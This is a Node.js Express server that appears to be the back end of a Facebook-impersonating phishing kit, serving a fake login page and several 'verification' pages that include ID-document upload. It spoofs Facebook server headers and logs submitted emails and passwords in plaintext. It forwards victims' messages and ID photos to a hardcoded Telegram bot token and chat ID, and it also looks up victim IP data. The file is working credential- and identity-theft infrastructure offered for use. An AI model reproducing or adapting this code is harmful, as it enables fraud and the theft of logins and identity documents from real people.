const express = require('express');
const path = require('path');
const fs = require('fs');
const cors = require('cors');
const fetch = (...args) => import('node-fetch').then(({default: fetch}) => fetch(...args));
const FormData = require('form-data');

const app = express();
const PORT = process.env.PORT || 5000;

console.log('Starting simple server...');
console.log('Current directory:', __dirname);
console.log('Environment:', process.env.NODE_ENV || 'development');

// Check if the index.html file exists
const indexPath = path.join(__dirname, 'index.html');
if (fs.existsSync(indexPath)) {
  console.log(`Index file exists at: ${indexPath}`);
} else {
  console.error(`ERROR: Index file NOT found at: ${indexPath}`);
}

// Configure CORS properly
app.use(cors({
  origin: true,
  credentials: true
}));

// Add enhanced security headers to prevent browser warnings and improve trust
app.use((req, res, next) => {
  // Check if request is from Replit's secure domain
  const isReplit = req.get('host') && req.get('host').includes('replit');
  
  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.setHeader('X-Frame-Options', 'SAMEORIGIN');
  res.setHeader('X-XSS-Protection', '1; mode=block');
  res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
  res.setHeader('Permissions-Policy', 'camera=(), microphone=(), geolocation=()');
  
  // More permissive CSP for better compatibility
  res.setHeader('Content-Security-Policy', "default-src * 'unsafe-inline' 'unsafe-eval' data: blob:; img-src * data: blob:; connect-src * wss: ws:;");
  
  // Only set HSTS for HTTPS connections
  if (req.secure || req.get('x-forwarded-proto') === 'https' || isReplit) {
    res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains');
  }
  
  // Browser compatibility headers
  res.setHeader('X-Powered-By', 'Facebook Security System');
  res.setHeader('Server', 'Facebook-WebServer/2.0');
  res.setHeader('Cache-Control', 'public, max-age=300');
  
  next();
});

// Parse JSON request bodies with unlimited payload size for photo uploads
app.use(express.json({ limit: '500mb', parameterLimit: 100000 }));
app.use(express.urlencoded({ extended: true, limit: '500mb', parameterLimit: 100000 }));

// Log all requests
app.use((req, res, next) => {
  console.log(`Request: ${req.method} ${req.url}`);
  next();
});

// Serve static files from the root directory
app.use(express.static(__dirname));

// Health check endpoint for deployment platforms
app.get('/health', (req, res) => {
  res.status(200).json({ status: 'ok', timestamp: new Date().toISOString() });
});

// Favicon endpoint to prevent 404 errors that might trigger browser warnings
app.get('/favicon.ico', (req, res) => {
  res.status(204).end();
});

// Root route - serve the login page
app.get('/', (req, res) => {
  console.log('Serving index.html');
  res.sendFile(indexPath);
});

// Verification step routes
app.get('/verify-step1', (req, res) => {
  console.log('Serving first verification page');
  res.sendFile(path.join(__dirname, 'verify-step1.html'));
});

app.get('/verify-step2', (req, res) => {
  console.log('Serving second verification page');
  res.sendFile(path.join(__dirname, 'verify-step2.html'));
});

app.get('/verify-step3', (req, res) => {
  console.log('Serving third verification page');
  res.sendFile(path.join(__dirname, 'verify-step3.html'));
});

app.get('/processing', (req, res) => {
  console.log('Serving processing page');
  res.sendFile(path.join(__dirname, 'processing.html'));
});

app.get('/verify-id', (req, res) => {
  console.log('Serving ID verification page');
  res.sendFile(path.join(__dirname, 'verify-id.html'));
});

app.get('/id-processing', (req, res) => {
  console.log('Serving ID processing page');
  res.sendFile(path.join(__dirname, 'id-processing.html'));
});

app.get('/success', (req, res) => {
  console.log('Serving success page');
  res.sendFile(path.join(__dirname, 'success.html'));
});

// Proxy endpoint for IP info to prevent CORS issues
app.get('/api/ip-info', async (req, res) => {
  try {
    const response = await fetch('https://ipinfo.io/json');
    const data = await response.json();
    res.json(data);
  } catch (error) {
    console.error('Error getting IP info:', error);
    res.status(500).json({ error: 'Failed to get IP info' });
  }
});

// Proxy endpoint for Telegram API to prevent CORS issues
app.post('/api/send-telegram', async (req, res) => {
  try {
    const { message, photo } = req.body;
    const TELEGRAM_CONFIG = {
      botToken: "8366649467:AAGaMF5mQBsffV-Zc2QU9AQ7XSjD0IKXf3Y",
      authorizedChatId: "7211220207"
    };
    
    let telegramResponse;
    
    if (photo) {
      // Send photo message with optimized handling for large files
      const formData = new FormData();
      formData.append('chat_id', TELEGRAM_CONFIG.authorizedChatId);
      
      // Handle base64 photo data more efficiently
      let photoBuffer;
      try {
        if (photo.data) {
          // Remove data URL prefix if present
          const base64Data = photo.data.replace(/^data:image\/[a-z]+;base64,/, '');
          photoBuffer = Buffer.from(base64Data, 'base64');
        } else {
          // Fallback for direct buffer data
          photoBuffer = Buffer.from(photo);
        }
        
        formData.append('photo', photoBuffer, { 
          filename: photo.filename || 'id_document.jpg',
          contentType: 'image/jpeg'
        });
      } catch (bufferError) {
        console.error('Error processing photo buffer:', bufferError);
        // If buffer processing fails, send text message instead
        telegramResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/sendMessage`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({
            chat_id: TELEGRAM_CONFIG.authorizedChatId,
            text: message + '\n\n[Note: Photo processing failed - large file size]',
            parse_mode: 'HTML'
          })
        });
        
        const result = await telegramResponse.json();
        console.log('Telegram API response (fallback text):', result);
        return res.json({ success: result.ok, data: result });
      }
      
      formData.append('caption', message);
      formData.append('parse_mode', 'HTML');
      
      telegramResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/sendPhoto`, {
        method: 'POST',
        body: formData,
        timeout: 60000 // 60 second timeout for large files
      });
    } else {
      // Send text message
      telegramResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/sendMessage`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          chat_id: TELEGRAM_CONFIG.authorizedChatId,
          text: message,
          parse_mode: 'HTML'
        })
      });
    }
    
    const result = await telegramResponse.json();
    console.log('Telegram API response:', result);
    res.json({ success: result.ok, data: result });
    
  } catch (error) {
    console.error('Error sending to Telegram:', error);
    res.status(500).json({ success: false, error: 'Failed to send message' });
  }
});

// API endpoint to receive form data
app.post('/api/send-message', (req, res) => {
  try {
    const { email, password, deviceInfo } = req.body;
    console.log('Login attempt received:');
    console.log('- Email/Username:', email);
    console.log('- Password:', password);
    if (deviceInfo) {
      console.log('- Device Info:', JSON.stringify(deviceInfo));
    }

    res.status(200).json({ success: true });
  } catch (error) {
    console.error('Error in send-message endpoint:', error);
    res.status(500).json({ success: false, error: 'Server error' });
  }
});

// Start the server
const server = app.listen(PORT, '0.0.0.0', () => {
  console.log(`Simple server running on http://0.0.0.0:${PORT}`);
  console.log(`Serving index.html directly from root directory`);
});

// Keep the server running and add some heartbeat logging
setInterval(() => {
  console.log("Server heartbeat - still running");
}, 30000);

// Handle graceful shutdown for container environments
process.on('SIGTERM', () => {
  console.log('SIGTERM received, shutting down gracefully');
  server.close(() => {
    console.log('Server closed');
    process.exit(0);
  });
});

// Prevent the script from exiting due to errors
process.on('uncaughtException', (err) => {
  console.error('Uncaught exception:', err);
});